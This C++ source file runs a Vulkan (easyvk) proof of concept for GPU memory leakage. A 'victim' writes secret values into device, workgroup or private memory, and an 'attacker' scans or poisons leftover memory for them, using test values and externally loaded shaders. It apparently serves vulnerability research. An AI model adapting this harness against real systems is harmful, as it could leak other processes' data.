#include <map>
#include <set>
#include <iostream>
#include <string>
#include <cstring>
#include <sstream>
#include <fstream>
#include <chrono>
#include <easyvk.h>
#include <unistd.h>

#ifdef _WIN32
#include <vector>
typedef unsigned int uint;
#endif

using namespace std;

int DEVICE_MEM = 0;
int PHYSICAL_DEVICE_MEM = 1;
int WORKGROUP_MEM = 2;
int PRIVATE_MEM = 3;
int CANARY = 91;

uint WORKGROUP_SIZE = 128;
uint WORKGROUPS = 32756;
uint NUM_THREADS = WORKGROUPS * WORKGROUP_SIZE;
uint VICTIM_MEM_SIZE = 134168576;
uint VICTIM_WG_MEM_SIZE = 2048;
uint VICTIM_BLOCK_SIZE = VICTIM_MEM_SIZE/(WORKGROUPS * WORKGROUP_SIZE);
uint VICTIM_WG_BLOCK_SIZE = VICTIM_WG_MEM_SIZE/WORKGROUP_SIZE;

uint ATTACKER_MEM_SIZE = 16384;
uint ATTACKER_WG_MEM_SIZE = 2048;
uint ATTACKER_BLOCK_SIZE = 128;
uint ATTACKER_WG_BLOCK_SIZE = ATTACKER_WG_MEM_SIZE/WORKGROUP_SIZE*2;

const char* spvCode = "shaders.spv";
const char* testSpvCode = "test-shaders.spv";
const char* physAddrSpvCode = "hack-shader-phys-addr.spv";

void listDevices() {
  auto instance = easyvk::Instance(false);
  int i = 0;
  for (auto physicalDevice : instance.physicalDevices()) {
    easyvk::Device device = easyvk::Device(instance, physicalDevice);
    cout << "Device: " << device.properties.deviceName << " ID: " << device.properties.deviceID << " Index: " << i << std::endl;
    i++;
  }
}

const char* chooseWriteSecretShader(int memType) {
  if (memType == DEVICE_MEM || memType == PHYSICAL_DEVICE_MEM) {
    return "device-write.spv";
  } else if (memType == WORKGROUP_MEM) {
    return "wg-write.spv";
  } else if (memType == PRIVATE_MEM) {
    return "private-write.spv";
  }
  return "";
}

const char* chooseHackShader(int memType) {
  if (memType == DEVICE_MEM) {
    return "device-hack.spv";
  } else if (memType == PHYSICAL_DEVICE_MEM) {
    return "phys-device-hack.spv";
  } else if (memType == WORKGROUP_MEM) {
    return "wg-hack.spv";
  } else if (memType == PRIVATE_MEM) {
    return "private-hack.spv";
  }
  return "";
}

bool doHack(easyvk::Device device, vector<easyvk::Buffer> bufs, int memType) {
  auto program = easyvk::Program(device, chooseHackShader(memType), bufs);
  program.setWorkgroups(WORKGROUPS);
  program.setWorkgroupSize(WORKGROUP_SIZE);
  if (memType == WORKGROUP_MEM) {
    program.setWorkgroupMemoryLength(ATTACKER_WG_MEM_SIZE*sizeof(int), 0);
  }
  program.initialize("hack");
  program.run();
  auto hackResults = bufs.at(1);
  for (uint j = 0; j < NUM_THREADS; j++) {
    if (hackResults.load<uint64_t>(j * 2) != 0) {
      cout << "Thread " << j << ": mem[" << hackResults.load<uint64_t>(j*2) << "] = " << hackResults.load<int>(j*4 + 2) << std::endl;
      return true;
    }
  }
  return false;
}

easyvk::Buffer hackParams(easyvk::Device device, int secretValue, bool workgroupMemory) {
  auto params = easyvk::Buffer(device, 1, 4*sizeof(uint32_t));
  if (workgroupMemory) {
    params.store<uint64_t>(0, ATTACKER_WG_MEM_SIZE);
    params.store<uint32_t>(2, ATTACKER_WG_BLOCK_SIZE);
  } else {
    params.store<uint64_t>(0, ATTACKER_MEM_SIZE);
    params.store<uint32_t>(2, ATTACKER_BLOCK_SIZE);
  }
  params.store<int>(3, secretValue);
  return params;
}

void hack(easyvk::Device device, int memType) {
  auto hackResults = easyvk::Buffer(device, NUM_THREADS, sizeof(uint32_t) * 4);
  auto params = hackParams(device, CANARY, memType == WORKGROUP_MEM);
  bool hacking = true;
  vector<easyvk::Buffer> lastBuf = {};
  while (hacking) {
    vector<easyvk::Buffer> bufs = {params, hackResults};
    if (memType != WORKGROUP_MEM) {
      auto mem = easyvk::Buffer(device, {ATTACKER_MEM_SIZE, sizeof(int), memType == PHYSICAL_DEVICE_MEM, true});
      if (memType == PHYSICAL_DEVICE_MEM) {
        auto addr = mem.device_addr();
	      params.store<uint64_t>(0, addr);
        cout << "Mem buffer address: " << addr << std::endl;
      }
      if (!lastBuf.empty()) {
	      lastBuf.back().teardown();
	      lastBuf.pop_back();
      }
      lastBuf.push_back(mem);
      bufs.push_back(mem);
    }
    uint i = 0;
    while (hacking && i < 10) {
      hacking = !doHack(device, bufs, memType);
      i++;
    }
    if (hacking) cout << "Recreating buffers\n";
  }
}

void doWriteSecret(easyvk::Device device, vector<easyvk::Buffer> bufs, int memType) {
 	auto program = easyvk::Program(device, chooseWriteSecretShader(memType), bufs);
	program.setWorkgroups(WORKGROUPS);
	program.setWorkgroupSize(WORKGROUP_SIZE);
  if (memType == WORKGROUP_MEM) {
    program.setWorkgroupMemoryLength(VICTIM_WG_MEM_SIZE*sizeof(int), 0);
  }
	program.initialize("writeSecret");
	program.run();
}

easyvk::Buffer writeSecretParams(easyvk::Device device, int secretValue, bool workgroupMemory) {
  auto params = easyvk::Buffer(device, 3, sizeof(uint32_t));
  params.store<int>(0, secretValue);
  params.store<int>(1, CANARY);
  if (workgroupMemory) {
    params.store<uint32_t>(2, VICTIM_WG_BLOCK_SIZE);
  } else {
    params.store<uint32_t>(2, VICTIM_BLOCK_SIZE);
  }
  return params;
}

void writeSecret(easyvk::Device device, int secretValue, int memType) {
  auto params = writeSecretParams(device, secretValue, memType == WORKGROUP_MEM);
  while (true) {
    vector<easyvk::Buffer> bufs = {params};
    if (memType != WORKGROUP_MEM) {
      auto mem = easyvk::Buffer(device, {VICTIM_MEM_SIZE, sizeof(int), memType == PHYSICAL_DEVICE_MEM, true});
      if (memType == PHYSICAL_DEVICE_MEM) {
        cout << "Mem buffer address: " << mem.device_addr() << std::endl;
      }
      bufs.push_back(mem);
    }
    for (uint i = 0; i < 10; i++) {
      doWriteSecret(device, bufs, memType);
    }
    if (memType != WORKGROUP_MEM) {
      bufs.back().teardown();
    }
    sleep(1);
    cout << "Recreating buffers\n";
  }
}

void doPoison(easyvk::Device device, vector<easyvk::Buffer> bufs, bool workgroupMemory) {
  auto program = easyvk::Program(device, spvCode, bufs);
  program.setWorkgroups(WORKGROUPS);
  program.setWorkgroupSize(WORKGROUP_SIZE);
  if (workgroupMemory) {
    program.setWorkgroupMemoryLength(ATTACKER_WG_MEM_SIZE*sizeof(int), 0);
    program.initialize("poisonWorkgroup");
  } else {
    program.initialize("poison");
  }
  program.run();
}

void poison(easyvk::Device device, int secretValue, int memType) {
  auto params = hackParams(device, secretValue, memType == WORKGROUP_MEM);
  while (true) {
    vector<easyvk::Buffer> bufs = {params};
    if (memType != WORKGROUP_MEM) {
      auto mem = easyvk::Buffer(device, {ATTACKER_MEM_SIZE, sizeof(int), memType == PHYSICAL_DEVICE_MEM, true});
      if (memType == PHYSICAL_DEVICE_MEM) {
        cout << "Mem buffer address: " << mem.device_addr() << std::endl;
      }
      bufs.push_back(mem);
    }
    for (uint i = 0; i < 10; i++) {
      doPoison(device, bufs, memType == WORKGROUP_MEM);
    }
    if (memType != WORKGROUP_MEM) {
      bufs.back().teardown();
    }
    sleep(1);
    cout << "Recreating buffers\n";
  }
}

bool doGetPoisoned(easyvk::Device device, vector<easyvk::Buffer> bufs, int memType) {
  const char* _spvCode;
  if (memType == PHYSICAL_DEVICE_MEM) {
    _spvCode = physAddrSpvCode;
  } else {
    _spvCode = spvCode;
  }
  auto program = easyvk::Program(device, _spvCode, bufs);
  program.setWorkgroups(WORKGROUPS);
  program.setWorkgroupSize(WORKGROUP_SIZE);
  if (memType == WORKGROUP_MEM) {
    program.setWorkgroupMemoryLength(VICTIM_WG_MEM_SIZE*sizeof(int), 0);
    program.initialize("getPoisonedWorkgroup");
  } else {
    program.initialize("getPoisoned");
  }
  program.run();

  auto hackResults = bufs.at(1);

  for (uint j = 0; j < NUM_THREADS; j++) {
    if (hackResults.load<uint32_t>(j * 4 + 2) != 0) {
      cout << "Thread " << j << ": mem[" << hackResults.load<uint64_t>(j*2) << "] = " << hackResults.load<int>(j*4 + 2) << std::endl;
      return true;
    }
  }
  return false;
}

void getPoisoned(easyvk::Device device, int secretValue, int memType) {
  auto hackResults = easyvk::Buffer(device, NUM_THREADS, sizeof(uint32_t) * 4);
  auto params = writeSecretParams(device, secretValue, memType == WORKGROUP_MEM);
  bool poisoning = true;
  vector<easyvk::Buffer> lastBuf = {};
  while (poisoning) {
    vector<easyvk::Buffer> bufs = {params, hackResults};
    if (memType != WORKGROUP_MEM) {
      auto mem = easyvk::Buffer(device, {VICTIM_MEM_SIZE, sizeof(int), memType == PHYSICAL_DEVICE_MEM, true});
      if (memType == PHYSICAL_DEVICE_MEM) {
        auto addr = mem.device_addr();
	params.store<uint64_t>(0, addr);
        cout << "Mem buffer address: " << addr << std::endl;
      }
      if (!lastBuf.empty()) {
	lastBuf.back().teardown();
	lastBuf.pop_back();
      }
      lastBuf.push_back(mem);
      bufs.push_back(mem);
    }
    uint i = 0;
    while (poisoning && i < 10) {
      poisoning = !doGetPoisoned(device, bufs, memType);
      i++;
    }
    if (poisoning) cout << "Recreating buffers\n";
  }
}

void both(easyvk::Device device, int secretValue, int memType) {
  auto _writeSecretParams = writeSecretParams(device, secretValue, memType == WORKGROUP_MEM);
  auto hackResults = easyvk::Buffer(device, NUM_THREADS, sizeof(uint32_t) * 4);
  auto _hackParams = hackParams(device, CANARY, memType == WORKGROUP_MEM);
  bool hacking = true;
  while (hacking) {
    vector<easyvk::Buffer> writeSecretBufs = {_writeSecretParams};
    vector<easyvk::Buffer> hackBufs = {_hackParams, hackResults};
    if (memType != WORKGROUP_MEM) {
      auto hackMem = easyvk::Buffer(device, {ATTACKER_MEM_SIZE, sizeof(int), true, true});
      auto writeSecretMem = easyvk::Buffer(device, {VICTIM_MEM_SIZE, sizeof(int), true, true});
      if (memType == PHYSICAL_DEVICE_MEM) {
        auto hackMemAddr = hackMem.device_addr();
        _hackParams.store<uint64_t>(0, hackMemAddr);
      }
      cout << "Hack memory buffer address: " << hackMem.device_addr() << std::endl;
      cout << "Write secret memory buffer address: " << writeSecretMem.device_addr() << std::endl;

      hackBufs.push_back(hackMem);
      writeSecretBufs.push_back(writeSecretMem);
    }
    uint i = 0;
    while (hacking && i < 10) {
      doWriteSecret(device, writeSecretBufs, memType);
      hacking = !doHack(device, hackBufs, memType);
      i++;
    }
    if (memType != WORKGROUP_MEM) {
      writeSecretBufs.back().teardown();
      hackBufs.back().teardown();
    }
    if (hacking) cout << "Recreating buffers\n";
  }
}

void test(easyvk::Device device) {
  auto params = easyvk::Buffer(device, 1, 4*sizeof(uint32_t));
  params.store<uint32_t>(2, ATTACKER_BLOCK_SIZE);
  params.store<int>(3, 42);

  auto bufA = easyvk::Buffer(device, {2, sizeof(int), true, false}); 
  bufA.store<int>(0, 42);
  bufA.store<int>(1, 52);
  auto addr = bufA.device_addr();
  params.store<uint64_t>(0, addr);
  cout << "Buffer A address: " << addr << std::endl;
  easyvk::Buffer hackResults = easyvk::Buffer(device, 1, 4*sizeof(uint32_t));
  vector<easyvk::Buffer> bufs = {params, hackResults};

 	auto program = easyvk::Program(device, testSpvCode, bufs);
	program.setWorkgroups(1);
	program.setWorkgroupSize(1);
	program.initialize("testDeviceMem");
	program.run();
  cout << "Thread " << 0 << ": mem[" << hackResults.load<uint64_t>(0) << "] = " << hackResults.load<int>(2) << std::endl;
}

int main(int argc, char *argv[])
{
  int deviceIndex = 0;
  int secretValue = 42;
  int memType = DEVICE_MEM; // 0 for device memory, 1 for physical device memory, 2 for workgroup memory, 3 for registers
  bool enableValidationLayers = false;
  bool _listDevices = false;
  const char* action;

  int c;
  while ((c = getopt(argc, argv, "vla:s:d:m:")) != -1)
    switch (c)
    {
    case 's':
      secretValue = atoi(optarg);
      break;
    case 'v':
      enableValidationLayers = true;
      break;
    case 'l':
      _listDevices = true;
      break;
    case 'a':
      action = optarg;
      break;
    case 'm':
      memType = atoi(optarg);
      break;
    case 'd':
      deviceIndex = atoi(optarg);
      break;
    case '?':
      if (optopt == 's' || optopt == 'd' || optopt == 'a')
        std::cerr << "Option -" << optopt << "requires an argument\n";
      else
        std::cerr << "Unknown option" << optopt << std::endl;
      return 1;
    default:
      abort();
    }
  
  if (_listDevices) {
    listDevices();
    return 0;
  } else {
    auto instance = easyvk::Instance(enableValidationLayers);
    auto physicalDevices = instance.physicalDevices();
    auto device = easyvk::Device(instance, physicalDevices.at(deviceIndex));
    std::cout << "Using device: " << device.properties.deviceName << std::endl;
    if (std::strcmp(action, "both") == 0) {
      both(device, secretValue, memType);
    } else if (std::strcmp(action, "hack") == 0) {
      hack(device, memType);
    } else if (std::strcmp(action, "write") == 0) {
      writeSecret(device, secretValue, memType);
    } else if (std::strcmp(action, "poison") == 0) {
      poison(device, secretValue, memType);
    } else if (std::strcmp(action, "poisonee") == 0) {
      getPoisoned(device, secretValue, memType);
    } else if (std::strcmp(action, "test") == 0) {
      test(device);
    }
  }
  return 0;
}
